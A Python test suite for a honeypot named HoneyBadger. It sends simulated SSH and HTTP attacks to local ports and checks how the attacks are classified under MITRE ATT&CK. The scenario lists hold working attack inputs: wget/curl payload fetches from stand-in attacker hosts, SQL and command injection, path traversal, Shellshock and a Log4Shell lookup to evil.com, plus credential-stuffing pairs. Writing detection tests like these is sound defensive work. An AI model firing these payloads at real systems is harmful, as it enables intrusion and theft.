#!/usr/bin/env python3
"""
HoneyBadger Attack Scenario Test Suite

Comprehensive test script that exercises all attack vectors HoneyBadger
is designed to detect and verifies correct MITRE ATT&CK classification.

Scenarios covered:
- SSH Credential Stuffing (T1110.004)
- SSH Brute Force (T1110)
- SSH Payload Download via wget/curl (T1105)
- SSH Post-Exploitation Commands (T1059, T1078)
- HTTP Web Scanning/Reconnaissance (T1595)
- HTTP Exploit Attempts - SQLi, RCE, Path Traversal (T1190)
- HTTP Credential Capture (T1110)
- MITRE ATT&CK Classification Accuracy
- GeoIP Enrichment
- Payload Tracking & Quarantine
"""

import asyncio
import argparse
import hashlib
import json
import logging
import sys
import time
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlencode

import aiohttp
import asyncssh
import psycopg2
from psycopg2.extras import RealDictCursor

# Add backend to path for imports
sys.path.insert(0, "/app")

from schemas import Service, Severity

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger(__name__)

# Test configuration
DEFAULT_SSH_HOST = "127.0.0.1"
DEFAULT_SSH_PORT = 8022
DEFAULT_HTTP_HOST = "127.0.0.1"
DEFAULT_HTTP_PORT = 8081
DEFAULT_API_HOST = "127.0.0.1"
DEFAULT_API_PORT = 8090
DEFAULT_DB_DSN = "postgresql://honeybadger:honeybadger@localhost:15432/honeybadger"


class AttackScenarioTester:
    """Test runner for HoneyBadger attack scenarios."""

    def __init__(
        self,
        ssh_host: str = DEFAULT_SSH_HOST,
        ssh_port: int = DEFAULT_SSH_PORT,
        http_host: str = DEFAULT_HTTP_HOST,
        http_port: int = DEFAULT_HTTP_PORT,
        api_host: str = DEFAULT_API_HOST,
        api_port: int = DEFAULT_API_PORT,
        db_dsn: str = DEFAULT_DB_DSN,
    ):
        self.ssh_host = ssh_host
        self.ssh_port = ssh_port
        self.http_host = http_host
        self.http_port = http_port
        self.api_base = f"http://{api_host}:{api_port}"
        self.db_dsn = db_dsn
        self.results: dict[str, Any] = {}
        self.session: aiohttp.ClientSession | None = None

    async def setup(self):
        """Initialize HTTP session and verify connectivity."""
        self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
        await self._verify_services()

    async def _verify_services(self):
        """Verify all services are reachable."""
        # Check API health
        async with self.session.get(f"{self.api_base}/health") as resp:
            if resp.status != 200:
                raise RuntimeError(f"API health check failed: {resp.status}")
            health = await resp.json()
            logger.info("API health: %s", health)

        # Check SSH port
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.ssh_host, self.ssh_port), timeout=5
            )
            writer.close()
            await writer.wait_closed()
            logger.info("SSH port %d reachable", self.ssh_port)
        except Exception as e:
            raise RuntimeError(f"SSH port {self.ssh_port} not reachable: {e}")

        # Check HTTP port
        try:
            async with self.session.get(f"http://{self.http_host}:{self.http_port}/") as resp:
                logger.info("HTTP port %d reachable (status %d)", self.http_port, resp.status)
        except Exception as e:
            raise RuntimeError(f"HTTP port {self.http_port} not reachable: {e}")

    async def cleanup(self):
        """Clean up resources."""
        if self.session:
            await self.session.close()

    def _db_query(self, query: str, params: tuple = None) -> list[dict]:
        """Execute a database query and return results."""
        with psycopg2.connect(self.db_dsn) as conn:
            with conn.cursor(cursor_factory=RealDictCursor) as cur:
                cur.execute(query, params)
                return cur.fetchall()

    def _wait_for_events(self, min_count: int, timeout: float = 10.0) -> list[dict]:
        """Wait for events to appear in database."""
        start = time.time()
        while time.time() - start < timeout:
            events = self._db_query(
                "SELECT * FROM events ORDER BY ts DESC LIMIT %s", (min_count,)
            )
            if len(events) >= min_count:
                return events
            time.sleep(0.5)
        return self._db_query("SELECT * FROM events ORDER BY ts DESC LIMIT %s", (min_count,))

    # ============================================================
    # SSH Attack Scenarios
    # ============================================================

    async def test_ssh_credential_stuffing(self) -> dict[str, Any]:
        """
        T1110.004 - Credential Stuffing
        Tests repeated login attempts with common username/password pairs.
        """
        logger.info("=== Testing SSH Credential Stuffing (T1110.004) ===")
        results = {"scenario": "credential_stuffing", "technique": "T1110.004", "tests": []}

        # Common credential pairs used in credential stuffing
        credentials = [
            ("root", "root"),
            ("admin", "admin"),
            ("administrator", "admin123"),
            ("user", "password"),
            ("test", "test123"),
            ("ubuntu", "ubuntu"),
            ("ec2-user", "ec2user"),
            ("centos", "centos"),
            ("pi", "raspberry"),
            ("postgres", "postgres"),
        ]

        for username, password in credentials:
            try:
                async with asyncssh.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username=username,
                    password=password,
                    known_hosts=None,
                    client_keys=[],
                ) as conn:
                    await conn.run("whoami", check=False)
                results["tests"].append({"username": username, "password": password, "success": True})
            except Exception as e:
                results["tests"].append({"username": username, "password": password, "success": False, "error": str(e)})
            await asyncio.sleep(0.1)  # Small delay between attempts

        # Wait for events to be processed
        await asyncio.sleep(2)
        events = self._wait_for_events(len(credentials))

        # Verify classification
        cred_events = [e for e in events if e["technique_id"] == "T1110.004"]
        results["events_captured"] = len(events)
        results["credential_stuffing_events"] = len(cred_events)
        results["classification_correct"] = len(cred_events) >= len(credentials) * 0.8  # Allow some variance

        logger.info("Credential stuffing: %d/%d events classified as T1110.004", len(cred_events), len(events))
        return results

    async def test_ssh_brute_force(self) -> dict[str, Any]:
        """
        T1110 - Brute Force (Password Spraying)
        Tests multiple password attempts against a single username.
        """
        logger.info("=== Testing SSH Brute Force (T1110) ===")
        results = {"scenario": "brute_force", "technique": "T1110", "tests": []}

        passwords = [
            "password",
            "123456",
            "password123",
            "admin123",
            "root123",
            "qwerty",
            "letmein",
            "welcome",
            "monkey",
            "dragon",
        ]

        for password in passwords:
            try:
                async with asyncssh.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username="root",
                    password=password,
                    known_hosts=None,
                    client_keys=[],
                ) as conn:
                    await conn.run("id", check=False)
                results["tests"].append({"password": password, "success": True})
            except Exception:
                results["tests"].append({"password": password, "success": False})
            await asyncio.sleep(0.1)

        await asyncio.sleep(2)
        events = self._wait_for_events(len(passwords))

        brute_events = [e for e in events if e["technique_id"] == "T1110" and e["severity"] == "medium"]
        results["events_captured"] = len(events)
        results["brute_force_events"] = len(brute_events)
        results["classification_correct"] = len(brute_events) >= len(passwords) * 0.7

        logger.info("Brute force: %d/%d events classified as T1110", len(brute_events), len(events))
        return results

    async def test_ssh_payload_download(self) -> dict[str, Any]:
        """
        T1105 - Ingress Tool Transfer
        Tests wget/curl commands to download payloads.
        """
        logger.info("=== Testing SSH Payload Download (T1105) ===")
        results = {"scenario": "payload_download", "technique": "T1105", "tests": []}

        payload_urls = [
            "http://evil.example/malware.sh",
            "https://cdn.attacker.com/payload.exe",
            "http://192.168.1.100/script.py",
            "https://raw.githubusercontent.com/attacker/repo/main/implant.sh",
        ]

        for url in payload_urls:
            try:
                async with asyncssh.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username="root",
                    password="anypassword",
                    known_hosts=None,
                    client_keys=[],
                ) as conn:
                    # Test wget
                    result = await conn.run(f"wget {url}", check=False)
                    results["tests"].append({"url": url, "command": "wget", "output": result.stdout[:200] if result.stdout else ""})
                    await asyncio.sleep(0.2)

                    # Test curl
                    result = await conn.run(f"curl -O {url}", check=False)
                    results["tests"].append({"url": url, "command": "curl", "output": result.stdout[:200] if result.stdout else ""})
                    await asyncio.sleep(0.2)

            except Exception as e:
                results["tests"].append({"url": url, "error": str(e)})

        await asyncio.sleep(2)
        events = self._wait_for_events(len(payload_urls) * 2)

        t1105_events = [e for e in events if e["technique_id"] == "T1105"]
        results["events_captured"] = len(events)
        results["t1105_events"] = len(t1105_events)
        results["payload_urls_captured"] = sum(1 for e in t1105_events if e["payload_url"])
        results["classification_correct"] = len(t1105_events) >= len(payload_urls) * 1.5  # wget + curl per URL

        logger.info("Payload download: %d/%d events classified as T1105, %d payload URLs captured",
                    len(t1105_events), len(events), results["payload_urls_captured"])
        return results

    async def test_ssh_post_exploitation(self) -> dict[str, Any]:
        """
        T1059 - Command and Scripting Interpreter
        T1078 - Valid Accounts
        Tests commands executed after successful authentication.
        """
        logger.info("=== Testing SSH Post-Exploitation (T1059, T1078) ===")
        results = {"scenario": "post_exploitation", "techniques": ["T1059", "T1078"], "tests": []}

        commands = [
            "whoami",
            "id",
            "uname -a",
            "pwd",
            "ls -la",
            "cat /etc/passwd",
            "cat /etc/hostname",
            "ps aux",
            "netstat -tulpn",
            "history",
        ]

        try:
            async with asyncssh.connect(
                self.ssh_host,
                port=self.ssh_port,
                username="root",
                password="anypassword",
                known_hosts=None,
                client_keys=[],
            ) as conn:
                for cmd in commands:
                    result = await conn.run(cmd, check=False)
                    results["tests"].append({"command": cmd, "exit_code": result.exit_status, "output_len": len(result.stdout) if result.stdout else 0})
                    await asyncio.sleep(0.1)
        except Exception as e:
            results["error"] = str(e)

        await asyncio.sleep(2)
        events = self._wait_for_events(len(commands) + 2)  # + handshake + auth

        t1059_events = [e for e in events if e["technique_id"] == "T1059"]
        t1078_events = [e for e in events if e["technique_id"] == "T1078"]

        results["events_captured"] = len(events)
        results["t1059_events"] = len(t1059_events)
        results["t1078_events"] = len(t1078_events)
        results["classification_correct"] = len(t1059_events) >= len(commands) * 0.8

        logger.info("Post-exploitation: %d T1059, %d T1078 events", len(t1059_events), len(t1078_events))
        return results

    # ============================================================
    # HTTP Attack Scenarios
    # ============================================================

    async def test_http_web_scanning(self) -> dict[str, Any]:
        """
        T1595 - Active Scanning
        Tests common scanner paths and probes.
        """
        logger.info("=== Testing HTTP Web Scanning (T1595) ===")
        results = {"scenario": "web_scanning", "technique": "T1595", "tests": []}

        scanner_paths = [
            "/.env",
            "/.git/config",
            "/.git/HEAD",
            "/.svn/entries",
            "/.htaccess",
            "/.htpasswd",
            "/backup",
            "/config",
            "/phpinfo.php",
            "/info.php",
            "/server-status",
            "/server-info",
            "/wp-admin",
            "/wp-login.php",
            "/wp-content",
            "/xmlrpc.php",
            "/administrator",
            "/admin",
            "/manager/html",
            "/console",
            "/actuator",
            "/actuator/health",
            "/metrics",
            "/health",
            "/api/v1",
            "/api/v2",
            "/swagger",
            "/graphql",
            "/.well-known",
            "/robots.txt",
            "/sitemap.xml",
            "/phpmyadmin",
            "/pma",
        ]

        for path in scanner_paths:
            try:
                async with self.session.get(f"http://{self.http_host}:{self.http_port}{path}") as resp:
                    text = await resp.text()
                    results["tests"].append({
                        "path": path,
                        "status": resp.status,
                        "content_type": resp.headers.get("Content-Type"),
                        "bait_hit": len(text) > 0 and resp.status != 404,
                    })
            except Exception as e:
                results["tests"].append({"path": path, "error": str(e)})
            await asyncio.sleep(0.05)

        await asyncio.sleep(2)
        events = self._wait_for_events(len(scanner_paths))

        t1595_events = [e for e in events if e["technique_id"] == "T1595"]
        results["events_captured"] = len(events)
        results["t1595_events"] = len(t1595_events)
        results["bait_hits"] = sum(1 for t in results["tests"] if t.get("bait_hit"))
        results["classification_correct"] = len(t1595_events) >= len(scanner_paths) * 0.7

        logger.info("Web scanning: %d/%d events classified as T1595, %d bait hits",
                    len(t1595_events), len(events), results["bait_hits"])
        return results

    async def test_http_exploit_attempts(self) -> dict[str, Any]:
        """
        T1190 - Exploit Public-Facing Application
        Tests SQL injection, RCE, path traversal, and other exploit patterns.
        """
        logger.info("=== Testing HTTP Exploit Attempts (T1190) ===")
        results = {"scenario": "exploit_attempts", "technique": "T1190", "tests": []}

        exploit_payloads = [
            # SQL Injection
            ("GET", "/?id=1' OR '1'='1", "SQLi in query param"),
            ("GET", "/?search=test' UNION SELECT * FROM users--", "SQLi UNION"),
            ("POST", "/login", "username=admin'--&password=anything", "SQLi login bypass"),

            # Command Injection
            ("GET", "/?cmd=;id", "Command injection semicolon"),
            ("GET", "/?cmd=|cat /etc/passwd", "Command injection pipe"),
            ("GET", "/?input=`whoami`", "Command injection backticks"),
            ("GET", "/?input=$(id)", "Command injection sub-shell"),

            # Path Traversal
            ("GET", "/../../../etc/passwd", "Path traversal"),
            ("GET", "/..%2f..%2f..%2fetc%2fpasswd", "URL encoded path traversal"),

            # LDAP Injection
            ("GET", "/?filter=*)(|(userPassword=*))", "LDAP injection"),

            # XSS
            ("GET", "/?q=<script>alert(1)</script>", "XSS script tag"),
            ("GET", "/?q=javascript:alert(1)", "XSS javascript protocol"),

            # Shellshock
            ("GET", "/", "", "Shellshock in User-Agent", {"User-Agent": "() { :; }; echo vulnerable"}),

            # Log4Shell
            ("GET", "/", "", "Log4Shell in User-Agent", {"User-Agent": "${jndi:ldap://evil.com/a}"}),

            # Spring4Shell
            ("POST", "/exploit", "class.module.classloader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7D", "Spring4Shell"),

            # Generic exploit in path
            ("GET", "/shell.php?cmd=id", "Webshell attempt"),
            ("GET", "/cmd.jsp?command=whoami", "JSP webshell"),
        ]

        for item in exploit_payloads:
            method, path, body, *rest = item
            desc = rest[0] if len(rest) > 0 else "exploit"
            headers = rest[1] if len(rest) > 1 else {}

            try:
                if method == "GET":
                    async with self.session.get(
                        f"http://{self.http_host}:{self.http_port}{path}",
                        headers=headers,
                    ) as resp:
                        await resp.text()
                else:
                    async with self.session.post(
                        f"http://{self.http_host}:{self.http_port}{path}",
                        data=body,
                        headers={"Content-Type": "application/x-www-form-urlencoded", **headers},
                    ) as resp:
                        await resp.text()

                results["tests"].append({"method": method, "path": path, "description": desc, "success": True})
            except Exception as e:
                results["tests"].append({"method": method, "path": path, "description": desc, "error": str(e)})
            await asyncio.sleep(0.05)

        await asyncio.sleep(2)
        events = self._wait_for_events(len(exploit_payloads))

        t1190_events = [e for e in events if e["technique_id"] == "T1190"]
        results["events_captured"] = len(events)
        results["t1190_events"] = len(t1190_events)
        results["classification_correct"] = len(t1190_events) >= len(exploit_payloads) * 0.6

        logger.info("Exploit attempts: %d/%d events classified as T1190", len(t1190_events), len(events))
        return results

    async def test_http_credential_capture(self) -> dict[str, Any]:
        """
        T1110 - Credential Capture via HTTP
        Tests login form submissions on bait pages.
        """
        logger.info("=== Testing HTTP Credential Capture (T1110) ===")
        results = {"scenario": "http_credential_capture", "technique": "T1110", "tests": []}

        login_attempts = [
            ("/login", "username", "password", "admin", "admin123"),
            ("/login", "username", "password", "root", "toor"),
            ("/wp-login.php", "log", "pwd", "admin", "wordpress"),
            ("/wp-login.php", "log", "pwd", "administrator", "admin123"),
            ("/phpmyadmin", "pma_username", "pma_password", "root", ""),
            ("/phpmyadmin", "pma_username", "pma_password", "pma", "pmapass"),
            ("/admin", "username", "password", "admin", "password123"),
        ]

        for path, user_field, pass_field, username, password in login_attempts:
            data = {user_field: username, pass_field: password}
            try:
                async with self.session.post(
                    f"http://{self.http_host}:{self.http_port}{path}",
                    data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                ) as resp:
                    await resp.text()
                    results["tests"].append({
                        "path": path,
                        "username": username,
                        "password": password,
                        "status": resp.status,
                        "success": True,
                    })
            except Exception as e:
                results["tests"].append({"path": path, "error": str(e)})
            await asyncio.sleep(0.1)

        await asyncio.sleep(2)
        events = self._wait_for_events(len(login_attempts))

        t1110_events = [e for e in events if e["technique_id"] == "T1110" and e["service"] == "http"]
        results["events_captured"] = len(events)
        results["t1110_events"] = len(t1110_events)
        results["credentials_captured"] = sum(1 for e in t1110_events if e["username"] and e["password_hash"])
        results["classification_correct"] = len(t1110_events) >= len(login_attempts) * 0.8

        logger.info("HTTP credential capture: %d/%d events classified as T1110, %d credentials captured",
                    len(t1110_events), len(events), results["credentials_captured"])
        return results

    # ============================================================
    # Verification Tests
    # ============================================================

    async def test_mitre_classification_accuracy(self) -> dict[str, Any]:
        """
        Verify MITRE ATT&CK technique classification accuracy
        by querying the API stats endpoint.
        """
        logger.info("=== Testing MITRE ATT&CK Classification Accuracy ===")
        results = {"scenario": "mitre_classification", "tests": []}

        async with self.session.get(f"{self.api_base}/stats?window=1h") as resp:
            stats = await resp.json()

        by_technique = stats.get("by_technique", [])
        results["techniques_found"] = by_technique

        expected_techniques = {
            "T1110": "Brute Force",
            "T1110.004": "Credential Stuffing",
            "T1595": "Active Scanning",
            "T1190": "Exploit Public-Facing Application",
            "T1105": "Ingress Tool Transfer",
            "T1059": "Command and Scripting Interpreter",
            "T1078": "Valid Accounts",
        }

        for tech_id, tech_name in expected_techniques.items():
            found = next((t for t in by_technique if t["technique_id"] == tech_id), None)
            results["tests"].append({
                "technique_id": tech_id,
                "technique_name": tech_name,
                "found": found is not None,
                "count": found["count"] if found else 0,
            })

        results["all_expected_found"] = all(t["found"] for t in results["tests"])
        logger.info("MITRE classification: %d/%d expected techniques found",
                    sum(1 for t in results["tests"] if t["found"]), len(expected_techniques))
        return results

    async def test_geoip_enrichment(self) -> dict[str, Any]:
        """
        Verify GeoIP enrichment is working by checking events
        have geographical information.
        """
        logger.info("=== Testing GeoIP Enrichment ===")
        results = {"scenario": "geoip_enrichment", "tests": []}

        # Query recent events
        events = self._db_query(
            "SELECT source_ip, country, region, city, latitude, longitude, asn FROM events WHERE ts > NOW() - INTERVAL '1 hour' ORDER BY ts DESC LIMIT 50"
        )

        enriched_count = 0
        for event in events:
            has_geo = any([
                event["country"],
                event["region"],
                event["city"],
                event["latitude"] is not None,
                event["longitude"] is not None,
                event["asn"],
            ])
            if has_geo:
                enriched_count += 1

        results["total_events_checked"] = len(events)
        results["enriched_events"] = enriched_count
        results["enrichment_rate"] = enriched_count / len(events) if events else 0
        results["sample_events"] = [
            {
                "ip": e["source_ip"],
                "country": e["country"],
                "city": e["city"],
                "asn": e["asn"],
            }
            for e in events[:5]
        ]

        logger.info("GeoIP enrichment: %d/%d events enriched (%.1f%%)",
                    enriched_count, len(events), results["enrichment_rate"] * 100)
        return results

    async def test_payload_tracking(self) -> dict[str, Any]:
        """
        Verify payload tracking captures URL, hash, and size metadata.
        """
        logger.info("=== Testing Payload Tracking ===")
        results = {"scenario": "payload_tracking", "tests": []}

        # Query payloads table
        payloads = self._db_query(
            "SELECT url, hash, size, quarantined, quarantine_path, first_seen FROM payloads ORDER BY first_seen DESC LIMIT 20"
        )

        results["payloads_captured"] = len(payloads)
        results["payloads_with_hash"] = sum(1 for p in payloads if p["hash"])
        results["payloads_with_size"] = sum(1 for p in payloads if p["size"])
        results["payloads_quarantined"] = sum(1 for p in payloads if p["quarantined"])

        results["sample_payloads"] = [
            {
                "url": p["url"][:80],
                "hash": p["hash"][:16] + "..." if p["hash"] else None,
                "size": p["size"],
                "quarantined": p["quarantined"],
            }
            for p in payloads[:5]
        ]

        logger.info("Payload tracking: %d captured, %d with hash, %d with size, %d quarantined",
                    len(payloads), results["payloads_with_hash"], results["payloads_with_size"], results["payloads_quarantined"])
        return results

    async def test_api_endpoints(self) -> dict[str, Any]:
        """
        Verify all API endpoints are functional.
        """
        logger.info("=== Testing API Endpoints ===")
        results = {"scenario": "api_endpoints", "tests": []}

        endpoints = [
            ("/health", "GET"),
            ("/events?limit=10", "GET"),
            ("/events?service=ssh", "GET"),
            ("/events?service=http", "GET"),
            ("/events?severity=high", "GET"),
            ("/events?technique=T1110", "GET"),
            ("/stats?window=1h", "GET"),
            ("/stats?window=24h", "GET"),
            ("/stats/timeseries?window=1h", "GET"),
            ("/stats/timeseries?window=24h", "GET"),
        ]

        for path, method in endpoints:
            try:
                async with self.session.request(method, f"{self.api_base}{path}") as resp:
                    data = await resp.json()
                    results["tests"].append({
                        "endpoint": path,
                        "method": method,
                        "status": resp.status,
                        "success": resp.status == 200,
                        "has_data": bool(data),
                    })
            except Exception as e:
                results["tests"].append({"endpoint": path, "error": str(e), "success": False})

        results["all_passed"] = all(t.get("success", False) for t in results["tests"])
        logger.info("API endpoints: %d/%d passed", sum(1 for t in results["tests"] if t.get("success")), len(endpoints))
        return results

    async def test_websocket_stream(self) -> dict[str, Any]:
        """
        Verify WebSocket event streaming works.
        """
        logger.info("=== Testing WebSocket Event Stream ===")
        results = {"scenario": "websocket_stream", "tests": []}

        try:
            async with self.session.ws_connect(f"{self.api_base}/ws/events") as ws:
                # Wait for hello message
                hello = await asyncio.wait_for(ws.receive_json(), timeout=5)
                results["tests"].append({"phase": "hello", "success": hello.get("type") == "hello", "data": hello})

                # Send ping
                await ws.send_json({"type": "ping"})
                pong = await asyncio.wait_for(ws.receive_json(), timeout=5)
                results["tests"].append({"phase": "ping_pong", "success": pong.get("type") == "pong", "data": pong})

                # Trigger an event and wait for it
                # Make a quick HTTP request to generate an event
                async with self.session.get(f"http://{self.http_host}:{self.http_port}/test-ws-trigger") as resp:
                    await resp.text()

                # Wait for event frame
                try:
                    event_frame = await asyncio.wait_for(ws.receive_json(), timeout=5)
                    results["tests"].append({
                        "phase": "live_event",
                        "success": event_frame.get("type") == "event",
                        "has_event_data": "event" in event_frame,
                    })
                except asyncio.TimeoutError:
                    results["tests"].append({"phase": "live_event", "success": False, "error": "timeout"})

        except Exception as e:
            results["tests"].append({"phase": "connection", "success": False, "error": str(e)})

        results["all_passed"] = all(t.get("success", False) for t in results["tests"])
        logger.info("WebSocket: %d/%d tests passed", sum(1 for t in results["tests"] if t.get("success")), len(results["tests"]))
        return results

    async def test_retention_purge(self) -> dict[str, Any]:
        """
        Verify retention manager can purge old data.
        """
        logger.info("=== Testing Retention Purge ===")
        results = {"scenario": "retention_purge", "tests": []}

        # Check retention config
        events = self._db_query("SELECT COUNT(*) as count FROM events")
        results["total_events"] = events[0]["count"] if events else 0

        # Check geoip cache
        geoip = self._db_query("SELECT COUNT(*) as count FROM geoip_cache")
        results["geoip_cache_entries"] = geoip[0]["count"] if geoip else 0

        # Check credential counts
        creds = self._db_query("SELECT COUNT(*) as count FROM credential_counts")
        results["credential_count_entries"] = creds[0]["count"] if creds else 0

        # Check payloads
        payloads = self._db_query("SELECT COUNT(*) as count FROM payloads")
        results["payload_entries"] = payloads[0]["count"] if payloads else 0

        results["tests"].append({"check": "events_table", "count": results["total_events"]})
        results["tests"].append({"check": "geoip_cache", "count": results["geoip_cache_entries"]})
        results["tests"].append({"check": "credential_counts", "count": results["credential_count_entries"]})
        results["tests"].append({"check": "payloads", "count": results["payload_entries"]})

        logger.info("Retention check: events=%d, geoip=%d, creds=%d, payloads=%d",
                    results["total_events"], results["geoip_cache_entries"],
                    results["credential_count_entries"], results["payload_entries"])
        return results

    # ============================================================
    # Main Runner
    # ============================================================

    async def run_all_scenarios(self, scenarios: list[str] = None) -> dict[str, Any]:
        """Run all or selected attack scenarios."""
        all_scenarios = {
            "ssh_credential_stuffing": self.test_ssh_credential_stuffing,
            "ssh_brute_force": self.test_ssh_brute_force,
            "ssh_payload_download": self.test_ssh_payload_download,
            "ssh_post_exploitation": self.test_ssh_post_exploitation,
            "http_web_scanning": self.test_http_web_scanning,
            "http_exploit_attempts": self.test_http_exploit_attempts,
            "http_credential_capture": self.test_http_credential_capture,
            "mitre_classification": self.test_mitre_classification_accuracy,
            "geoip_enrichment": self.test_geoip_enrichment,
            "payload_tracking": self.test_payload_tracking,
            "api_endpoints": self.test_api_endpoints,
            "websocket_stream": self.test_websocket_stream,
            "retention_purge": self.test_retention_purge,
        }

        if scenarios is None:
            scenarios = list(all_scenarios.keys())

        summary = {
            "started_at": datetime.now(timezone.utc).isoformat(),
            "scenarios_run": [],
            "results": {},
            "overall_passed": True,
        }

        for scenario_name in scenarios:
            if scenario_name not in all_scenarios:
                logger.warning("Unknown scenario: %s", scenario_name)
                continue

            logger.info("\n>>> Running scenario: %s <<<", scenario_name)
            try:
                result = await all_scenarios[scenario_name]()
                summary["scenarios_run"].append(scenario_name)
                summary["results"][scenario_name] = result

                # Determine if scenario passed
                passed = result.get("classification_correct", result.get("all_passed", result.get("all_expected_found", True)))
                if not passed:
                    summary["overall_passed"] = False
                    logger.warning("Scenario %s: FAILED", scenario_name)
                else:
                    logger.info("Scenario %s: PASSED", scenario_name)

            except Exception as e:
                logger.exception("Scenario %s failed with exception", scenario_name)
                summary["results"][scenario_name] = {"error": str(e), "failed": True}
                summary["overall_passed"] = False

            # Small delay between scenarios
            await asyncio.sleep(1)

        summary["completed_at"] = datetime.now(timezone.utc).isoformat()
        return summary


async def main():
    parser = argparse.ArgumentParser(description="HoneyBadger Attack Scenario Test Suite")
    parser.add_argument("--scenarios", nargs="+", help="Specific scenarios to run (default: all)")
    parser.add_argument("--ssh-host", default=DEFAULT_SSH_HOST, help="SSH honeypot host")
    parser.add_argument("--ssh-port", type=int, default=DEFAULT_SSH_PORT, help="SSH honeypot port")
    parser.add_argument("--http-host", default=DEFAULT_HTTP_HOST, help="HTTP honeypot host")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT, help="HTTP honeypot port")
    parser.add_argument("--api-host", default=DEFAULT_API_HOST, help="API host")
    parser.add_argument("--api-port", type=int, default=DEFAULT_API_PORT, help="API port")
    parser.add_argument("--db-dsn", default=DEFAULT_DB_DSN, help="PostgreSQL DSN")
    parser.add_argument("--output", "-o", help="Output JSON file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    tester = AttackScenarioTester(
        ssh_host=args.ssh_host,
        ssh_port=args.ssh_port,
        http_host=args.http_host,
        http_port=args.http_port,
        api_host=args.api_host,
        api_port=args.api_port,
        db_dsn=args.db_dsn,
    )

    try:
        await tester.setup()
        results = await tester.run_all_scenarios(args.scenarios)
    finally:
        await tester.cleanup()

    # Print summary
    print("\n" + "=" * 60)
    print("ATTACK SCENARIO TEST SUMMARY")
    print("=" * 60)
    print(f"Overall: {'PASSED' if results['overall_passed'] else 'FAILED'}")
    print(f"Scenarios run: {len(results['scenarios_run'])}")
    for scenario in results["scenarios_run"]:
        result = results["results"].get(scenario, {})
        status = "PASS" if result.get("classification_correct", result.get("all_passed", result.get("all_expected_found", True))) else "FAIL"
        print(f"  {scenario}: {status}")
    print("=" * 60)

    # Save results if output specified
    if args.output:
        import json
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2, default=str)
        logger.info("Results saved to %s", args.output)

    # Exit with appropriate code
    sys.exit(0 if results["overall_passed"] else 1)


if __name__ == "__main__":
    asyncio.run(main())